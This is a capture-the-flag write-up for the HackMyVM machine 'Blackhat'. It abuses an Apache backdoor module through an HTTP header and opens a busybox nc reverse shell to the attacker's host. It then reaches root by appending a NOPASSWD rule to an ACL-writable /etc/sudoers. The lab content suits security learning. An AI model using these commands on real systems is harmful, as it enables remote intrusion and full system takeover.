# Blackhat

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.97:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.97
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title:  Hacked By HackMyVM
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/blackhat/writeup.png)

```bash
â””â”€$ feroxbuster -u http://10.0.2.97 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET       62l      121w     1437c http://10.0.2.97/
200      GET       62l      121w     1437c http://10.0.2.97/index.html
200      GET      769l     4038w    69275c http://10.0.2.97/phpinfo.php
```

There's an odd module in Apache2

![writeup-1.png](/assets/pentest/hackmyvm/blackhat/writeup-1.png)

- [apache2_BackdoorMod](https://github.com/VladRico/apache2_BackdoorMod)
- [Apache-HTTP-Server-Module-Backdoor](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/tree/main)

2 results came up, but only second one worked.
```bash
â””â”€$ curl -H 'Backdoor: id' http://10.0.2.97
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

```bash
â””â”€$ curl -H 'Backdoor: busybox nc 10.0.2.15 4444 -e /bin/bash' http://10.0.2.97
---
â””â”€$ pwncat-cs -lp 4444
[15:54:39] Welcome to pwncat ðŸˆ!                      
[15:54:51] received connection from 10.0.2.97:55458   
[15:54:52] 10.0.2.97:55458: registered new host w/ db 
(remote) www-data@blackhat:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation (darkdante)

I was unable to identify a viable privilege escalation vector, it's possible none exists. Adopting an attacker's mindset, I tried `su` and unexpectedly became the user `darkdante` without being prompted for a password.
```bash
(remote) www-data@blackhat:/$ su - darkdante
darkdante@blackhat:~$ id
uid=1000(darkdante) gid=1000(darkdante) groups=1000(darkdante)
```

### User.txt

```bash
darkdante@blackhat:~$ cat user.txt
89fac491dc9bdc5fc4e3595dd396fb11
```

## Privilege Escalation (root)

Assuming the host was already compromised, we considered attacker tactics that could yield root. A review of common configuration files revealed an unexpected ACL marker (`+`) on `/etc/sudoers`.
```bash
darkdante@blackhat:~$ ls -l /etc/passwd /etc/shadow /etc/sudoers
-rw-r--r--  1 root root   1482 Nov 11  2022 /etc/passwd
-rw-r-----  1 root shadow  840 Nov 19  2022 /etc/shadow
-r--rw----+ 1 root root    669 Nov 19  2022 /etc/sudoers

darkdante@blackhat:~$ getfacl /etc/sudoers
getfacl: Removing leading '/' from absolute path names
# file: etc/sudoers
# owner: root
# group: root
user::r--
user:darkdante:rw-
group::r--
mask::rw-
other::---
```

```bash
darkdante@blackhat:~$ echo $'darkdante\tALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
darkdante@blackhat:~$ sudo su
root@blackhat:/home/darkdante# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@blackhat:/home/darkdante# cat /root/root.txt
8cc6110bc1a0607015c354a459468442
```